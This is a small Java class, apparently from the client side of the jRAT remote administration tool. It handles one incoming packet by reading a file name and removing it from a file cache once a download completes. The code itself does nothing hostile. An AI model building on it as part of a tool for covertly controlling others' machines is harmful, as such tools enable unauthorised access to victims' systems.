package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.io.FileCache;


public class Packet103CompleteClientDownload implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();
		
		FileCache.remove(file);
	}

}
